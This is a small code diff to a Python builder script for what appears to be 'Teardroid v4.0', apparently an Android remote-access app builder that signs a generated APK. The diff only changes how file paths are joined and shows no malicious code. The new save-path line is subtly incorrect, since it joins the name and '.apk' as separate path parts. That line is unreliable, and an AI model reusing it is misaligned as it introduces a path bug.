@@ -15,7 +15,7 @@ from colorama import Fore, Style
 
 
 class Config(BaseModel):
-    apktool: str = os.getcwd() + "/apktool.sh"
+    apktool: str = os.path.join(os.getcwd(),"apktool.sh")
     version: str = 'Teardroid v4.0'
     current_dir: str = os.getcwd()
 
@@ -60,7 +60,7 @@ def builder(name: str) -> None:
     Teardroid.SingAPK()
     Teardroid.Clear()
     Teardroid.print_result("Proccess Completed Successfully")
-    Teardroid.print_result("Saved as " + os.getcwd() + "/" + name + ".apk")
+    Teardroid.print_result("Saved as " + os.path.join(os.getcwd(),name,".apk"))
 
 
 if __name__ == '__main__':
